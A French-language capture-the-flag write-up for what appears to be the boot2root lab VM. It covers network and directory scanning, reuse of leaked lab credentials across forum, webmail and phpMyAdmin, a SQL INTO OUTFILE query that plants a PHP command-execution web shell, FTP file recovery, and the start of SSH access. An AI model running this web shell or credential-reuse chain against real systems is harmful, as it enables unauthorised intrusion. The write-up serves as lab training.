<h2>RECHERCHE D'IP</h2>
installation de nmap
<pre><code>> sudo apt-get install nmap
> nmap -sP 192.168.1.0/24 

Nmap scan report for csp1.zte.com.cn (192.168.1.1)
Host is up (0.0052s latency).
Nmap scan report for 192.168.1.10 (192.168.1.10)
Host is up (0.0080s latency).
Nmap scan report for 192.168.1.17 (192.168.1.17)
Host is up (0.011s latency).
Nmap scan report for 192.168.1.28 (192.168.1.28)
Host is up (0.0031s latency).
Nmap scan report for 192.168.1.255 (192.168.1.255)
Host is up (0.0040s latency).
Nmap done: 256 IP addresses (5 hosts up) scanned in 3.19 seconds

> nmap 192.168.1.28

Nmap scan report for 192.168.1.28 (192.168.1.28)
Host is up (0.0055s latency).
Not shown: 987 filtered ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
25/tcp  open  smtp
80/tcp  open  http
110/tcp open  pop3
119/tcp open  nntp
143/tcp open  imap
443/tcp open  https
465/tcp open  smtps
563/tcp open  snews
587/tcp open  submission
993/tcp open  imaps
995/tcp open  pop3s

Nmap done: 1 IP address (1 host up) scanned in 4.71 seconds
</code></pre>

<code>nmap -sP 192.168.1.0/24 </code>-> nous donne les différentes ips connectées, on utilise nmap sur chacune pour trouver une ip contenant un port https open pour trouver l'ip de la vm

Après avoir réussi à trouver l'ip, nous allons chercher les différents paths de l'ip sur le port https grace à dirb
<pre><code>> sudo apt-get install dirb
> dirb https://IP

GENERATED WORDS: 4612

---- Scanning URL: https://192.168.1.28/ ----
+ https://192.168.1.28/cgi-bin/ (CODE:403|SIZE:289)
==> DIRECTORY: https://192.168.1.28/forum/
==> DIRECTORY: https://192.168.1.28/phpmyadmin/
+ https://192.168.1.28/server-status (CODE:403|SIZE:294)
==> DIRECTORY: https://192.168.1.28/webmail/

</code></pre>

<h2>Partie HTTPS</h2>

Ensuite on se dirige vers /phpmyadmin, et on nous demande de fournir un mdp et un login, donc nous allons sur /formum

On trouve un topic : <code>Probleme login ?</code>
On voit que le topic est créé par lmezard, et que la page est rempli de log créé par un admin,
on cherche donc le nom lmezard dans la page, et on tombe sur ceci:
<pre><code>Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)</code></pre>

On voit un password sur la première ligne, donc on va essayer de se connecter au profil de lmezard sur le forum.

<code>login: lmezard

mdp: !q\]Ej?*5K5cy*AJ</code>

Ensuite on va sur son profil, ou l'on trouve son adresse mail.

<code>laurie@borntosec.net</code>

On tente de se connecter sur https://IP/webmail avec le même password, et ça marche.
On découvre 2 mails, celui qui nous intéresse est DB ACCESS, dans lequel on trouve le login et le mdp pour phpmyadmin

<code>root/Fg-'kKXBj87E:aJ$
</code>

Après s'être connecté sur phpmyadmin, on cherche a ouvrir un terminal grâce a un port apache ouvert:

```sql
SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET['cmd']) {system($_GET[\'cmd\']);} ?> </pre></BODY></HTML>"
INTO OUTFILE '/var/www/forum/templates_c/phpshell.php'
```

On se dirige vers https://IP/forum/templates_c/phpshell.php et on y rentre la commande suivante pour lister les fichiers du terminal php:
<code>find / -user www-data -print 2>/dev/null</code>

On voit sur la sortie <code>/home/LOOKATME/password</code> et on l'affiche:

<code>lmezard:G!@M6f4Eatau{sF"</code>

<h2>Partie FILEZILLA</h2>

On a un accès ouvert a un port FTP, on va essayer le couple login/mdp sur un logiciel capable de lire ce genre de port (Filezilla par exemple), et ça fonctionne.
On trouve a la racine un fichier fun et un Readme, on les import pour les exploiter.

README:
<pre><code>Complete this little challenge and use the result as password for user 'laurie' to login in ssh</code></pre>

Le fichier fun est en fait une compression, on le décompresse avec la commande <code>tar -xvf fun </code> et on obtient un dossier remplis de .pcap.

On applique donc un script permettant de trier les fichiers, qui par la suite créera un main.c en commentant tout les trolls:

```c
import os
import re

main = {}

for file in os.listdir("ft_fun"):
	with open(f"ft_fun/{file}", "r") as f:
		code = f.read()
		# print(code)
		result = re.findall(r'//file([0-9]*)', code)
		main[int(result[0])] = code

with open("main.c", "w+") as f:
	for value in sorted(main.items()):
		f.write(str(value[1]) + "\n")
```
<pre><code>> gcc main.c
> ./a.out
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit%</code></pre>

On passe un sha256 sur le password récupéré et on obtient:
<code>330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4</code>

On peut maintenant se connecter en ssh a boot2root avec le login laurie et le passwdn récupéré

<h2>Partie SSH</h2>

A la racine de la vm, on trouve un executable bomb et un README
Bomb est un petit script nous demandant 6 passwords pour defuse la bombe, et ainsi récupérer le mot de passe de l'user thor
